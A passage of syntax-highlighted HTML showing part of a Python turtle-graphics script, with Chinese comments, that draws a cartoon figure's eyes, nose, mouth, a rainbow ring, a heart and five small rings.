class="token punctuation">)</span></pre></td></tr><tr><td data-num="193"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="194"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="195"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="196"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="197"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="198"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="199"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="200"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="201"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="202"></td><td><pre></pre></td></tr><tr><td data-num="203"></td><td><pre><span class="token comment"># 左眼</span></pre></td></tr><tr><td data-num="204"></td><td><pre><span class="token comment"># 眼圈</span></pre></td></tr><tr><td data-num="205"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="206"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="207"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="208"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="209"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="210"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="211"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="212"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="213"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="214"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="215"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="216"></td><td><pre><span class="token comment"># 眼珠</span></pre></td></tr><tr><td data-num="217"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="218"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="219"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="220"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="221"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="222"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="223"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="224"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="225"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="226"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="227"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="228"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"darkslategray"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="229"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="230"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="231"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="232"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="233"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="234"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="235"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="236"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="237"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="238"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="239"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="240"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="241"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="242"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="243"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="244"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="245"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"white"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="246"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="247"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="248"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="249"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="250"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="251"></td><td><pre></pre></td></tr><tr><td data-num="252"></td><td><pre><span class="token comment"># 鼻子</span></pre></td></tr><tr><td data-num="253"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="254"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="255"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="256"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="257"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="258"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="259"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="260"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="261"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="262"></td><td><pre></pre></td></tr><tr><td data-num="263"></td><td><pre><span class="token comment"># 嘴</span></pre></td></tr><tr><td data-num="264"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="265"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="266"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">36</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="267"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="268"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="269"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="270"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">132</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="271"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="272"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="273"></td><td><pre></pre></td></tr><tr><td data-num="274"></td><td><pre><span class="token comment"># 彩虹圈</span></pre></td></tr><tr><td data-num="275"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="276"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="277"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="278"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"cyan"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="279"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="280"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="281"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="282"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="283"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="284"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="285"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="286"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="287"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"slateblue"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="288"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="289"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="290"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="291"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="292"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="293"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="294"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="295"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="296"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"orangered"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="297"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="298"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="299"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="300"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="301"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="302"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="303"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="304"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="305"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"gold"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="306"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="307"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="308"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="309"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="310"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="311"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="312"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="313"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="314"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"greenyellow"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="315"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="316"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="317"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="318"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="319"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="320"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="321"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="322"></td><td><pre></pre></td></tr><tr><td data-num="323"></td><td><pre><span class="token comment"># 爱心</span></pre></td></tr><tr><td data-num="324"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="325"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="326"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"brown"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="327"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="328"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"brown"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="329"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="330"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="331"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="332"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="333"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="334"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="335"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="336"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="337"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="338"></td><td><pre></pre></td></tr><tr><td data-num="339"></td><td><pre><span class="token comment"># 五环</span></pre></td></tr><tr><td data-num="340"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="341"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="342"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="343"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"blue"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="344"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="345"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="346"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="347"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="348"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="349"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="350"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="351"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="352"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="353"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"brown"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="354"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="355"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="356"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">175</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="357"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="358"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"lightgoldenrod"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="359"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="360"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="361"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">175</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="362"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="363"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"green"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="364"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td 